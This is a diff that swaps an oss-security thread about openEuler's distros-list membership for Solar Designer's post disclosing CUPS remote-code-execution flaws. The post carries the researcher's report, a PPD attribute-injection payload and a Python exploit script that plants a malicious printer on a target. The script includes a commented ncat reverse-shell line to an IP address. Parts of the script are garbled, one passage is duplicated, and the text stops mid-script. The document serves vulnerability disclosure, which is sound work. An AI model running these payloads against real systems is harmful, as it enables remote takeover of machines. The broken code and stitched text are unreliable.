@@ -1,4 +1,4 @@
-Received: (qmail 25862 invoked by uid 550); 16 Oct 2023 18:29:29 -0000
+Received: (qmail 19621 invoked by uid 550); 26 Sep 2024 22:11:41 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,204 +7,548 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 6084 invoked from network); 16 Oct 2023 18:15:06 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
-	invisiblethingslab.com; h=cc:content-type:content-type:date:date
-	:from:from:in-reply-to:in-reply-to:message-id:mime-version
-	:references:reply-to:sender:subject:subject:to:to; s=fm2; t=
-	1697480094; x=1697566494; bh=2RimEs5Q4j6dpDqVOFvcmtTS1vKSpMmeqTp
-	Pgmv0Avs=; b=Jiv76Rc4gL/LY7DkKm7I5pcXbDBpd+Ln15Za2gQeS/RbVzvaB00
-	m7Jo1NF5m0DRY9fPVHi36fGUpjrq5QjWQ/FLOQW4Be5EJMEVOSgJFQwJu7AbV7NZ
-	0wZtWGlBfHtNDgls4YDl4t6hFowigBZFdtsg3fUSUAdJytU4Tw0EA3Ld4t2NtvNw
-	sWsyie0KicqP55ar+CziwLsdvmo2rpkXDRqoJLWuU7RHJlp2ejLX3prq6B4LI4GH
-	NHtqY8PVR5nhCSgoUxuMlRWwKzsQsp2N4fArBR5doxXdGvnEpMxGUCeVOckQijGT
-	V/o+EQtvIIx3/tvSqWO3h38WePIRg8vceOA==
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
-	messagingengine.com; h=cc:content-type:content-type:date:date
-	:feedback-id:feedback-id:from:from:in-reply-to:in-reply-to
-	:message-id:mime-version:references:reply-to:sender:subject
-	:subject:to:to:x-me-proxy:x-me-proxy:x-me-sender:x-me-sender
-	:x-sasl-enc; s=fm3; t=1697480094; x=1697566494; bh=2RimEs5Q4j6dp
-	DqVOFvcmtTS1vKSpMmeqTpPgmv0Avs=; b=Oy1IBgA/E5AYAqaXIcO8qpjQkBO4M
-	K5LEfil+NiZ1WcXdqkWQlq4iCHIBr87lkFstyPGsbtuuYpSZ7huBPzmaYVhOMLAj
-	8CUt/epoElCRQ29m/4pm70aTNOLOBg1CE+Lzf1Q+neza46apKME16n0lL+U1MigG
-	71p1G9W1x1X1jPN7OqjNpeueK2CFbSZ+HeBhZz3kS46Za6vG7l6ChNuxUqZunItC
-	aw/PXhhNbFD1YW6K9FeTJVzxsz4mGLx28ImwLxIShRvBpYGhAbnetLQ3vsWXz4gd
-	DSygCgqZVluwctydVaIgYEs8FNPW3IzBO4WwvsPNaMu55h3YH2Xdss/IA==
-X-ME-Sender: <xms:nX0tZcDNRjGaWsdq5an0g8XdQv4qo1ynfwV55lXPeKuGb_45_aC-cg>
-    <xme:nX0tZeg29gwPNKNKm6AVy2aeOAc6oMXdS6A-ritZNFRCSvU_5PomFt0qFV7srTD8h
-    42d8BJ1IivuYCY>
-X-ME-Received: <xmr:nX0tZfkoan9JscGZoUxgZXK45KDCTTe1aeuMHEtnrzeltd2GlivWFRorseEuo3LFrcqVxxdaiTmsmRgtJDlx_VuqQEcSGSY5YqtK5OF_W_Jmvkqp>
-X-ME-Proxy-Cause: gggruggvucftvghtrhhoucdtuddrgedvkedrjedtgdduudelucetufdoteggodetrfdotf
-    fvucfrrhhofhhilhgvmecuhfgrshhtofgrihhlpdfqfgfvpdfurfetoffkrfgpnffqhgen
-    uceurghilhhouhhtmecufedttdenucenucfjughrpeffhffvuffkfhggtggujgesghdtre
-    ertddtjeenucfhrhhomhepffgvmhhiucforghrihgvucfqsggvnhhouhhruceouggvmhhi
-    sehinhhvihhsihgslhgvthhhihhnghhslhgrsgdrtghomheqnecuggftrfgrthhtvghrnh
-    eptdegueffudetlefhhedufeethffghfefjeeifefgkefgheejudelgfehgfdujeehnecu
-    ffhomhgrihhnpehlihhnuhigfhhouhhnuggrthhiohhnrdhorhhgnecuvehluhhsthgvrh
-    fuihiivgeptdenucfrrghrrghmpehmrghilhhfrhhomhepuggvmhhisehinhhvihhsihgs
-    lhgvthhhihhnghhslhgrsgdrtghomh
-X-ME-Proxy: <xmx:nX0tZSyUcplalvFoS9cCW5pNZUIJzT3z1cwVaz2rPFFYNjVSKXK52w>
-    <xmx:nX0tZRRjvEP5HNtXC61CuoyMGZ7CRczLZXGsxo-TfBykhaaHP8qObg>
-    <xmx:nX0tZdbDkEcjCZZPiF0LcCiWQLYM1BemTv3hAp0emGb5-XFehRbbpg>
-    <xmx:nn0tZYcw-9zwfVjDXm0-_1Z2lzLBeadPQVTFEacN4rywU0VCES_Pmg>
-Feedback-ID: iac594737:Fastmail
-Date: Mon, 16 Oct 2023 14:14:43 -0400
-From: Demi Marie Obenour <demi@invisiblethingslab.com>
+x-ms-reactions: disallow
+Received: (qmail 18193 invoked from network); 26 Sep 2024 22:11:33 -0000
+Date: Fri, 27 Sep 2024 00:11:25 +0200
+From: Solar Designer <solar@openwall.com>
 To: oss-security@lists.openwall.com
-Message-ID: <ZS19nIeWpxgqfWim@itl-email>
-References: <ZSyUUSF_-3YbT14k@workstation>
- <20231016080850.GF10758@suse.de>
- <2023101612-snare-dart-c7cf@gregkh>
- <ZS1CSkbTjDYdGq8F@itl-email>
- <2023101622-imply-tidal-b6cf@gregkh>
- <ZS1UPsZo1VyHDAkV@itl-email>
- <CAMr=8w4N87t24jrRzw+hLHnhB9EoYDtjgic8yVPBqv6jJY_ZvA@mail.gmail.com>
- <2023101605-outshoot-undying-fb27@gregkh>
-MIME-Version: 1.0
-Content-Type: multipart/signed; micalg=pgp-sha512;
-	protocol="application/pgp-signature"; boundary="AQ6hyMnPsBqoWESi"
+Cc: Simone Margaritelli <evilsocket@gmail.com>
+Message-ID: <20240926221125.GA10895@openwall.com>
+Mime-Version: 1.0
+Content-Type: multipart/mixed; boundary="gKMricLos+KVdGMg"
 Content-Disposition: inline
-In-Reply-To: <2023101605-outshoot-undying-fb27@gregkh>
-Subject: Re: [oss-security] linux-distros membership application of openEuler
+User-Agent: Mutt/1.4.2.3i
+Subject: [oss-security] CUPS printing system vulnerabilities
 
---AQ6hyMnPsBqoWESi
-Content-Type: text/plain; protected-headers=v1; charset=utf-8
+--gKMricLos+KVdGMg
+Content-Type: text/plain; charset=us-ascii
 Content-Disposition: inline
-Content-Transfer-Encoding: quoted-printable
-Date: Mon, 16 Oct 2023 14:14:43 -0400
-From: Demi Marie Obenour <demi@invisiblethingslab.com>
-To: oss-security@lists.openwall.com
-Subject: Re: [oss-security] linux-distros membership application of openEuler
 
-On Mon, Oct 16, 2023 at 06:49:38PM +0200, Greg KH wrote:
-> On Tue, Oct 17, 2023 at 12:15:30AM +0800, Aron Xu wrote:
-> > Hi,
-> >=20
-> > On Mon, Oct 16, 2023 at 11:34=E2=80=AFPM Demi Marie Obenour
-> > <demi@invisiblethingslab.com> wrote:
-> > >
-> > > On Mon, Oct 16, 2023 at 04:52:32PM +0200, Greg KH wrote:
-> > > > On Mon, Oct 16, 2023 at 10:01:44AM -0400, Demi Marie Obenour wrote:
-> > > > > On Mon, Oct 16, 2023 at 10:23:50AM +0200, Greg KH wrote:
-> > > > > > On Mon, Oct 16, 2023 at 10:08:50AM +0200, Marcus Meissner wrote:
-> > > > > > > Hi,
-> > > > > > >
-> > > > > > > Regardless of your viability of subscription status I think w=
-e also
-> > > > > > > (sadly) have to consider current geopolitical issues here.
-> > > > > > >
-> > > > > > > As far as I understand, US companies and US citizens are not =
-permitted
-> > > > > > > to work with Chinese organizations and/or Chinese nationals.
-> > > > > >
-> > > > > > They can when working in the open on public projects and other
-> > > > > > open-source-like things.  For "closed" lists and groups, please=
- consult
-> > > > > > a lawyer as the rules there are quite varied and depends on the
-> > > > > > countries and companies involved.
-> > > > > >
-> > > > > > But to be sure, again, consult your corporate lawyers, they kno=
-w the
-> > > > > > rules and the issues involved better than I do.
-> > > > > >
-> > > > > > good luck!
-> > > > > >
-> > > > > > greg k-h
-> > > > >
-> > > > > The question is _who_ should consult their lawyers.
-> > > >
-> > > > The people deciding if this group can be added to the closed list as
-> > > > they are the ones responsible for it, AND then if the group is adde=
-d,
-> > > > the members of the list need to talk to their lawyers to see if the=
-ir
-> > > > country laws allow them to participate in a closed group with such
-> > > > members.  Many countries might be fine, many might not be, it all
-> > > > depends on the participants and what country laws they must abide b=
-y.
-> > > >
-> > > > So in short, everyone involved in the list!  :(
-> > > >
-> > > > good luck!
-> > > >
-> > > > greg "I talk to too many lawyers" k-h
-> > >
-> > > The result of this is simply that those who do not have access to
-> > > lawyers on staff will not participate, which will reduce the value of
-> > > the list substantially.  I suspect that most people who report
-> > > vulnerabilities via distros@ fall into this category.  I know I do.
-> > >
-> > > Therefore, I recommend rejecting the application as too risky from a
-> > > legal perspective.
-> > >
-> >=20
-> > Not matter what would be the outcome, I'd like recommend an article
-> > from Linux Foundation which I think is a good read:
-> > https://www.linuxfoundation.org/resources/publications/understanding-us=
--export-controls-with-open-source-projects
-> >=20
-> > I'm not a lawyer though, but here are a few cents:
-> >=20
-> > 1) There is no general restrictions against Chinese organizations and n=
-ationals;
-> > 2) Open source software (which is publicly available) is not subject
-> > to EAR (Export Administration Regulation of the US);
-> > 3) According to =C2=A7 734.7[1] of EAR, "knowledge with the intention t=
-hat
-> > such information will be made publicly available if accepted" is
-> > treated as "Published" and is considered publicly available.
-> >=20
-> > If I understand correctly, distros list is targeted to open source
-> > software issues with a policy[2] of "Please only use these lists to
-> > report and discuss security issues that are not yet public (but that
-> > are to be made public very soon)", then everyone could retain their
-> > peace of mind.
->=20
-> But note, the information is _not_ public for a period of time, and so,
-> might fall outside of the information described above in the lf article.
->=20
-> Especially given the content of the information as well, this isn't just
-> "here's a patch to add a new feature for foo-baz" type of stuff.
->=20
-> Again, if you have questions, please talk to a lawyer from your company
-> as only they can answer it properly for your situation.
+Hi,
 
-Please do not assume that everyone works for a company with lawyers.
-There are plenty of people who are self-employed or who work for small
-companies without legal teams of their own.  For these people, =E2=80=9Cask=
- your
-lawyer before doing X=E2=80=9D is the same as =E2=80=9Cdon=E2=80=99t do X=
-=E2=80=9D.
+Simone Margaritelli (evilsocket) has discovered multiple vulnerabilities
+in the CUPS printing system and the way it's configured in some distros.
 
-To be clear: if openEuler was granted membership, this would ensure that
-I did not post on distros@ ever again, unless a trusted entity (such as
-the Linux Foundation) made a public, broadly applicable, and easily
-interpretable (by non-lawyers) statement stating that it would be okay
-for me to make such a post.  And maybe not even then.
---=20
-Sincerely,
-Demi Marie Obenour (she/her/hers)
-Invisible Things Lab
+A lot of drama around the disclosure of those issues was going on for
+maybe a month now, with public tweets about the disclosure process and
+the issues affecting many distros but excluding detail on the issues
+(not even CUPS was specifically mentioned until very recently).  Per
+those tweets, the issues were communicated to some distro vendors via
+CERT/CC VINCE and a vendor planned to bring them to the distros list on
+September 30 with public disclosure on October 6.  Unfortunately, the
+information leaked prematurely and thus Simone decided on full public
+disclosure today at 20:00 UTC pre-announcing it only 2 hours in advance.
 
---AQ6hyMnPsBqoWESi
-Content-Type: application/pgp-signature; name="signature.asc"
+Here's Simone's blog post on the issues:
 
------BEGIN PGP SIGNATURE-----
+https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/
 
-iQIzBAEBCgAdFiEEdodNnxM2uiJZBxxxsoi1X/+cIsEFAmUtfZwACgkQsoi1X/+c
-IsGiPQ//aPy1g4P6eQK9S1CtrsITiQYxcyeNjcs4MKlwgw/fmmEIsoeqIsLMsXtN
-yGRsw3yLl7vf2FxJ0UQH5tkIQKXiTpJJmS4vt2Hv12bLPKqFxdzilqGGBW+JZrBV
-kKOpCxazDC+PPh9S4PwF/f3cH3WH5Up507lyo+tDc0P2BDlJS4o4yoAfjcd/LFsB
-+PH5EaSOPq6wDdMIRLFEGhtjg90CStNhz1IhpH3AanzY/oda7/6P3irY9p1yfBsp
-WamNVGP3q4vfx0CltK9f5/Q9ZcRB36liEnEUDp5wpKOOGX5BZ3x/TJB7drsoWZBF
-i3DkJqvtsBEF9uDtgzQZCBs0vm916EQg7MMmPG+PeSAsdwr1xCu11q8vivlnIuaB
-wmirmYTIpzawbNZQvlfjQi98dEXa7RDnO4akPpXme+ZGXMlgnW8WO71aD666zkTA
-aeQZYHDliDb+2O5cc/xsxuVn4MOsQzFM8rvhJxlwfOLUA3fBnNVO9/dqUD+S6/l0
-b6bTBISDJvkkQJgpWvggz7SFFwlcj6xrwSkItZxRkSD4CldrPS2s3w9Fp/BcSEy1
-R6i9hdemAtAZZexI3YxIuLLGOIE4x0UL6Fusxu6n9LNFB+JF+NzDOKznnKtUpifm
-NP2oWKZ0lx6nplhFV5tyzhnMGuRRE3r2QiSGDdZwDZ4Cn/q2/QE=
-=pRmJ
------END PGP SIGNATURE-----
+I cannot easily convert the nicely formatted blog post into plain text,
+but here's an excerpt:
 
---AQ6hyMnPsBqoWESi--
+> Summary
+> 
+> * CVE-2024-47176 | cups-browsed <= 2.0.1 binds on UDP INADDR_ANY:631
+>   trusting any packet from any source to trigger a
+>   Get-Printer-Attributes IPP request to an attacker controlled URL.
+> * CVE-2024-47076 | libcupsfilters <= 2.1b1 cfGetPrinterAttributes5 does
+>   not validate or sanitize the IPP attributes returned from an IPP server,
+>   providing attacker controlled data to the rest of the CUPS system.
+> * CVE-2024-47175 | libppd <= 2.1b1 ppdCreatePPDFromIPP2 does not
+>   validate or sanitize the IPP attributes when writing them to a temporary
+>   PPD file, allowing the injection of attacker controlled data in the
+>   resulting PPD.
+> * CVE-2024-47177 | cups-filters <= 2.0.1 foomatic-rip allows arbitrary
+>   command execution via the FoomaticRIPCommandLine PPD parameter.
+> 
+> (can you already see where this is going? :D)
+> 
+> Plus a couple of other bugs that will be mentioned and that are arguably
+> security issues but have been pretty much ignored during the conversation
+> with the developers and the CERT. They are still there, along with several
+> other bugs that are more or less exploitable.
+> 
+> Impact
+> 
+> A remote unauthenticated attacker can silently replace existing printers'
+> (or install new ones) IPP urls with a malicious one, resulting in
+> arbitrary command execution (on the computer) when a print job is started
+> (from that computer).
+> 
+> Entry Points
+> 
+>   * WAN / public internet: a remote attacker sends an UDP packet to port
+>     631. No authentication whatsoever.
+>   * LAN: a local attacker can spoof zeroconf / mDNS / DNS-SD
+>     advertisements (we will talk more about this in the next writeup) and
+>     achieve the same code path leading to RCE.
+
+Someone posted Simone's leaked pre-notification at:
+
+https://gist.github.com/stong/c8847ef27910ae344a7b5408d9840ee1
+
+Here's an excerpt:
+
+> Original report
+> 
+> * Affected Vendor: OpenPrinting
+> * Affected Product: Several components of the CUPS printing system:
+> cups-browsed, libppd, libcupsfilters and cups-filters.
+> * Affected Version: All versions <= 2.0.1 (latest release) and master.
+> * Significant ICS/OT impact? no
+> * Reporter: Simone Margaritelli [evilsocket@gmail.com]
+> * Vendor contacted? yes The vendor has been notified trough Github
+> 
+> Advisories and all bugs have been confirmed:
+> 
+> https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8
+> https://github.com/OpenPrinting/libcupsfilters/security/advisories/GHSA-w63j-6g73-wmg5
+> https://github.com/OpenPrinting/libppd/security/advisories/GHSA-7xfx-47qg-grp6
+> https://github.com/OpenPrinting/cups-filters/security/advisories/GHSA-p9rh-jxmq-gq47
+
+The GitHub advisories above have just been opened to the public.
+
+Since it is in Markdown, I'll attach it to here.  Be aware that it's
+somewhat out of date compared to the blog post, but OTOH it contains
+some detail that isn't in the blog post, such as the exploit script.
+
+After today's public disclosure, someone else has also posted an
+exploit here:
+
+https://github.com/RickdeJager/cupshax
+
+Alexander
+
+--gKMricLos+KVdGMg
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: attachment; filename="cups-browsed.md"
+
+Original report
+
+* Affected Vendor: OpenPrinting 
+* Affected Product: Several components of the CUPS printing system: cups-browsed, libppd, libcupsfilters and cups-filters.
+* Affected Version: All versions <= 2.0.1 (latest release) and master.
+* Significant ICS/OT impact? no
+* Reporter: Simone Margaritelli [evilsocket@gmail.com]
+* Vendor contacted? yes The vendor has been notified trough Github Advisories and all bugs have been confirmed:
+
+- https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8
+- https://github.com/OpenPrinting/libcupsfilters/security/advisories/GHSA-w63j-6g73-wmg5
+- https://github.com/OpenPrinting/libppd/security/advisories/GHSA-7xfx-47qg-grp6
+- https://github.com/OpenPrinting/cups-filters/security/advisories/GHSA-p9rh-jxmq-gq47
+
+I'm also in contact with the Canonical security team about these issues.
+Description The vulnerability affects many GNU/Linux distributions:
+
+https://pkgs.org/download/cups-browsed
+
+Google ChromeOS:
+
+https://chromium.googlesource.com/chromiumos/overlays/chromiumos-overlay/+/master/net-print/cups-filters/cups-filters-1.28.5.ebuild#137
+
+Most BSDs:
+
+https://man.freebsd.org/cgi/man.cgi?query=cups-browsed.conf&sektion=5&apropos=0&manpath=FreeBSD+13.2-RELEASE+and+Ports
+
+And possibly more.
+
+---
+
+A series of bugs in the CUPS printers discovery mechanism (`cups-browsed`) and in other components of the CUPS system, can be chained together to allow a remote attacker to automatically install a malicious printer (or hijack an existing one via mDNS) to execute arbitrary code on the target host as the `lp` user when a print job is sent to it.
+
+As a reference useful to understand what follows, the main flow is:
+
+0. cups-browsed discovers a printer either via UDP probe or DNS-SD.
+1. it connects to the IPP server reported by the advertisement and fetches its properties.
+2. these properties are saved to a temporary PPD file used to describe the printer to the rest of the system.
+
+The following report explains how to exploit this in order force the service to write user controlled data to the temporary file and ultimately achieving code execution via network request.
+
+I'm attaching a cups.mp4 video of a the full remote code execution chain against cups-browsed 2.0.1 on Ubuntu 24.04.1 LTS.
+
+### Forcing it to connect to a malicious IPP server via discovery
+
+The `cups-browsed` component is responsible for discovering printers on a network and adding them to the system. In order to do so, the service uses two distinct protocols.
+
+For the first one, the service binds on all interfaces on UDP port 631 and accepts a custom packet from any untrusted source (bug number 1):
+
+https://github.com/OpenPrinting/cups-browsed/blob/master/daemon/cups-browsed.c#L13992
+
+This is the first and most severe attack vector as it's exploitable from outside the LAN if the computer is exposed on the public internet ( https://www.shodan.io/search?query=port%3A631+product%3A%22CUPS+%28IPP%29%22 ).
+
+The service also listens for DNS-SD / mDNS advertisements trough AVAHI:
+
+https://github.com/OpenPrinting/cups-browsed/blob/master/daemon/cups-browsed.c#L11576
+
+In both cases, when a printer is discovered by either the UDP packet or mDNS, its IPP or IPPS url is **automatically** contacted by cups-browsed and a `Get-Printer-Attributes` request is sent to it:
+
+https://github.com/OpenPrinting/cups-browsed/blob/master/daemon/cups-browsed.c#L3994 
+
+And, among other things, leaks its kernel version via `User-Agent` header:
+
+![leak](https://github.com/user-attachments/assets/914c6935-8176-4df8-87e4-0406f072af64)
+
+### Returning malicious IPP attributes
+
+Please note that it is enough for the IPP server to respond with a valid response in order for the printer to be added to the system and, if discovered via mDNS, an existing printer can be directly hijacked (its IPP url replaced with a malicious one) making it indistinguishable from the original one. 
+
+Most importantly (bug number 2) note that the `cfGetPrinterAttributes` API does not perform any sanitization on any of the IPP attributes returned by the server. Attributes that are then saved, as they are, in a temporary PPD file via `ppdCreatePPDFromIPP2`:
+
+https://github.com/OpenPrinting/cups-browsed/blob/master/daemon/cups-browsed.c#L8628
+
+It is also possible to note how `ppdCreatePPDFromIPP2` doesn't perform any sanitization itself and in fact it just writes to the file any attributes contents:
+
+https://github.com/OpenPrinting/libppd/blob/0d90320157135b9ec585617e1545793b274c7f82/ppd/ppd-generator.c#L353
+
+This allows an attacker (see attached PoC) to return a malicious IPP attribute in the form of (`printer-privacy-policy-uri` is just one of the several attributes that can be used, the RCE was also confirmed with `printer-info`, `printer-name` and `printer-make-and-model`):
+
+```
+printer-privacy-policy-uri = https://www.google.com/%22%5Cn*FoomaticRIPCommandLine: "echo 1 > /tmp/PWNED"\n*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip
+```
+
+Notice the double quote and the new line, this will result in the following PPD snippet:
+
+```
+...
+*cupsPrivacyURI: "https://www.google.com/"
+*FoomaticRIPCommandLine: "echo 1 > /tmp/PWNED"
+*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip"
+...
+```
+
+This will set the `cupsPrivacyURI` to a valid value but also add the `FoomaticRIPCommandLine` and `cupsFilter2` entries. Also notice the space between `culsFilter2` and the semicolon - its purpose is to bypass these trivial checks:
+
+https://github.com/OpenPrinting/cups-browsed/blob/master/daemon/cups-browsed.c#L8939
+
+### Command execution
+
+These two lines:
+
+```
+*FoomaticRIPCommandLine: "echo 1 > /tmp/PWNED"
+*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip"
+```
+
+Essentially tell the CUPS system to execute the `foomatic-rip` filter binary when a print job is sent to this printer.
+
+The `FoomaticRIPCommandLine` is then used to exploit a vulnerablity that was already patched:
+
+[https://nvd.nist.gov/vuln/detail/CVE-2011-2964]
+
+[https://nvd.nist.gov/vuln/detail/CVE-2011-2964]
+
+fix: https://github.com/Distrotech/foomatic-filters/commit/20f05ab502d9e7a5bef58de16eca82d3745a7ad9
+
+However, the fix is **not** present in `foomatic-rip/foomaticrip.c`:
+
+https://github.com/OpenPrinting/cups-filters/blob/master/filter/foomatic-rip/foomaticrip.c#L983
+
+As it is possible to see from the handling of the `--ppd` argument that was not removed as in the foomatic-filters fix.
+
+This is a 13 years old vulnerability which fix has never been ported to this library that now replaced it:
+
+- https://dilfridge.blogspot.com/2013/12/foomatic-is-moving-into-cups-filters.html
+- https://unix.stackexchange.com/questions/378557/what-is-the-difference-between-cups-filters-and-foomatic-filters
+
+> Some time ago the cups-filters maintainers took over maintainership of the foomatic-filters part for CUPS as well, and integrated it cleanly into cups- filters. That's the reason for the blocker; recent cups-filters contain the newest foomatic code available. The former separate foomatic-filters package is now unmaintained.
+
+In short, by relying on the fact that FoomaticRIPCommandLine can be used to execute ANY command, that IPP attributes are never sanitized and that the discovery mechanism trusts blindly anything coming from *:631 or mDNS, we achieve remote command execution on the system when a print job is triggered.
+
+## How does an attacker exploit this vulnerability?
+
+An attacker can exploit this vulnerability if it can connect to the host via UDP port 631, which is by default bound to INADDR_ANY, in which case the attack can be entirely remote, or if it's on the same network of the target, by using mDNS advertisements.
+
+## What does an attacker gain by exploiting this vulnerability?
+
+Remote execution of arbitrary commands when a print job is sent to the system printer.
+
+## How was the vulnerability discovered?
+
+A lot of curiosity (when I noticed the *:631 UDP bind I was like "wtf is this?!" and went down a rabbit hole ...) and good old source code auditing.
+
+## Is this vulnerability publicly known?
+
+No, the bugs are not known and the FoomaticRIPCommandLine vulnerability is known to be already patched (it isn't).
+
+## Is there evidence that this vulnerability is being actively exploited?
+
+Not to the best of my knowledge.
+
+## Do you plan to publicly disclose this vulnerability yourself?
+
+Yes, I already agreed on a 30 days disclosure embargo with the vendor, which will end on October 6. I'm open to extending it if anyone needs more time.
+
+* https://dilfridge.blogspot.com/2013/12/foomatic-is-moving-into-cups-filters.html
+* https://unix.stackexchange.com/questions/378557/what-is-the-difference-between-cups-filters-and-foomatic-filters
+
+> Some time ago the cups-filters maintainers took over maintainership of the foomatic-filters part for CUPS as well, and integrated it cleanly into cups- filters. That's the reason for the blocker; recent cups-filters contain the newest foomatic code available. The former separate foomatic-filters package is now unmaintained.
+
+In short, by relying on the fact that FoomaticRIPCommandLine can be used to execute ANY command, that IPP attributes are never sanitized and that the discovery mechanism trusts blindly anything coming from *:631 or mDNS, we achieve remote command execution on the system when a print job is triggered.
+
+I'm attaching the exploit code, it uses the ippserver package ( [https://github.com/h2g2bob/ipp-server] ), run as `exploit.py ATTACKER_EXTERNAL_IP TARGET_IP`, will create the `/tmp/I_AM_VULNERABLE` file on the target machine when a print job is started:
+
+```python
+#!/usr/bin/env python3
+import socket
+import threading
+import time
+import sys
+
+
+from ippserver.server import IPPServer
+import ippserver.behaviour as behaviour
+from ippserver.server import IPPRequestHandler
+from ippserver.constants import (
+	OperationEnum, StatusCodeEnum, SectionEnum, TagEnum
+)
+from ippserver.parsers import Integer, Enum, Boolean
+from ippserver.request import IppRequest
+
+
+class MaliciousPrinter(behaviour.StatelessPrinter):
+	def __init__(self, command):
+		self.command = command
+		super(MaliciousPrinter, self).__init__()
+
+def minimal_attributes(self):
+	return {
+		# This list comes from
+		# [https://tools.ietf.org/html/rfc2911]
+		# Section 3.1.4.2 Response Operation Attributes
+		(
+			SectionEnum.operation,
+			b'attributes-charset',
+			TagEnum.charset
+		): [b'utf-8'],
+		(
+			SectionEnum.operation,
+			b'attributes-natural-language',
+			TagEnum.natural_language
+		): [b'en'],
+	}
+
+def printer_list_attributes(self):
+	attr = {
+		# rfc2911 section 4.4
+		(
+			SectionEnum.printer,
+			b'printer-uri-supported',
+			TagEnum.uri
+		): [self.printer_uri],
+		(
+			SectionEnum.printer,
+			b'uri-authentication-supported',
+			TagEnum.keyword
+			): [b'none'],
+		(
+			SectionEnum.printer,
+			b'uri-security-supported',
+			TagEnum.keyword
+		): [b'none'],
+		(
+			SectionEnum.printer,
+			b'printer-name',
+			TagEnum.name_without_language
+		): [b'Main Printer'],
+		(
+			SectionEnum.printer,
+			b'printer-info',
+			TagEnum.text_without_language
+		): [b'Main Printer Info'],
+		(
+			SectionEnum.printer,
+			b'printer-make-and-model',
+			TagEnum.text_without_language
+		): [b'HP 0.00'],
+		(
+			SectionEnum.printer,
+			b'printer-state',
+			TagEnum.enum
+		): [Enum(3).bytes()], # XXX 3 is idle
+		(
+			SectionEnum.printer,
+			b'printer-state-reasons',
+			TagEnum.keyword
+		): [b'none'],
+		(
+			SectionEnum.printer,
+			b'ipp-versions-supported',
+			TagEnum.keyword
+		): [b'1.1'],
+		(
+			SectionEnum.printer,
+			b'operations-supported',
+			TagEnum.enum
+		): [
+			Enum(x).bytes()
+			for x in (
+			OperationEnum.print_job, # (required by cups)
+			OperationEnum.validate_job, # (required by cups)
+			OperationEnum.cancel_job, # (required by cups)
+			OperationEnum.get_job_attributes, # (required by cups)
+			OperationEnum.get_printer_attributes,
+		)],
+		(
+			SectionEnum.printer,
+			b'multiple-document-jobs-supported',
+			TagEnum.boolean
+		): [Boolean(False).bytes()],
+		(
+			SectionEnum.printer,
+			b'charset-configured',
+			TagEnum.charset
+		): [b'utf-8'],
+		(
+			SectionEnum.printer,
+			b'charset-supported',
+			TagEnum.charset
+		): [b'utf-8'],
+		(
+			SectionEnum.printer,
+			b'natural-language-configured',
+			TagEnum.natural_language
+		): [b'en'],
+		(
+			SectionEnum.printer,
+			b'generated-natural-language-supported',
+			TagEnum.natural_language
+		): [b'en'],
+		(
+			SectionEnum.printer,
+			b'document-format-default',
+			TagEnum.mime_media_type
+		): [b'application/pdf'],
+		(
+			SectionEnum.printer,
+			b'document-format-supported',
+			TagEnum.mime_media_type
+		): [b'application/pdf'],
+		(
+			SectionEnum.printer,
+			b'printer-is-accepting-jobs',
+			TagEnum.boolean
+		): [Boolean(True).bytes()],
+		(
+			SectionEnum.printer,
+			b'queued-job-count',
+			TagEnum.integer
+		): [Integer(666).bytes()],
+		(
+			SectionEnum.printer,
+			b'pdl-override-supported',
+			TagEnum.keyword
+		): [b'not-attempted'],
+		(
+			SectionEnum.printer,
+			b'printer-up-time',
+			TagEnum.integer
+		): [Integer(self.printer_uptime()).bytes()],
+		(
+			SectionEnum.printer,
+			b'compression-supported',
+			TagEnum.keyword
+		): [b'none'],
+		(
+			SectionEnum.printer,
+			b'printer-privacy-policy-uri',
+			TagEnum.uri
+		): [b'https//www.google.com/%22%5Cn*FoomaticRIPCommandLine: "' + self.command.encode() + b'"\n*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip'],
+	}
+	attr.update(self.minimal_attributes())
+	return attr
+
+def operation_printer_list_response(self, req, _psfile):
+	print("target connected, sending payload ...")
+	attributes = self.printer_list_attributes()
+	return IppRequest(
+		self.version,
+		StatusCodeEnum.ok,
+		req.request_id,
+		attributes
+	)
+
+
+def send_browsed_packet(ip, port, ipp_server_host, ipp_server_port):
+	print("sending udp packet to %s:%d ..." % (ip, port))
+
+	printer_type = 0x00
+	printer_state = 0x03
+	printer_uri = 'http://%s:%d/printers/NAME' % (
+		ipp_server_host, ipp_server_port
+	)
+	printer_location = 'Office HQ'
+	printer_info = 'Printer'
+
+	message = bytes('%x %x %s "%s" "%s"' % (
+		printer_type,
+		printer_state,
+		printer_uri,
+		printer_location,
+		printer_info), 'UTF-8'
+	)
+
+	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+	sock.sendto(message, (ip, port))
+
+
+def wait_until_ctrl_c():
+	try:
+		while True:
+		printer_uptimetime.sleep(300)
+	except KeyboardInterrupt:
+		return
+
+
+def run_server(server):
+	print('malicious ipp server listening on ', server.server_address)
+	server_thread = threading.Thread(target=server.serve_forever)
+	server_thread.daemon = True
+	server_thread.start()
+	wait_until_ctrl_c()
+	server.shutdown()
+
+
+if __name__ == "__main__":
+	if len(sys.argv) != 3:
+		print("%s <LOCAL_HOST> <TARGET_HOST>" % sys.argv[0])
+		quit()
+
+	SERVER_HOST = sys.argv[1]
+	SERVER_PORT = 12345
+
+	# "sh -c \'echo $(uname -a) > /tmp/GOD\'"
+	# ncat -e /bin/sh 192.168.50.19 4242
+
+	command = "echo 1 > /tmp/I_AM_VULNERABLE"
+
+	server = IPPServer((SERVER_HOST, SERVER_PORT),
+	IPPRequestHandler, MaliciousPrinter(command))
+
+	threading.Thread(
+		target=run_server,
+		args=(server, )
